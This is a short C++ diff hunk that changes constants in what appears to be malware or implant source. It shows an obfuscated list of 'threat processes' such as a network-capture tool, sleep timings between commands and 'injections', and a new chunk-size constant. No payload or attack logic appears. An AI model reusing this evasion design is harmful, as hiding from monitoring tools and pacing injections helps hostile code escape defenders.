@@ -15,6 +15,8 @@ const std::string THREAT_PROCESSES[] = {
 	std::string(OBFUSCATE("netcap.exe"))
 };
 
-const size_t SLEEP_BETWEEN_COMMANDS = 10;
+constexpr size_t SLEEP_BETWEEN_COMMANDS = 10;
 
-const size_t SLEEP_BETWEEN_INJECTIONS = 60;
+constexpr size_t SLEEP_BETWEEN_INJECTIONS = 60;
+
+constexpr size_t CHUNK_SIZE = 1024;
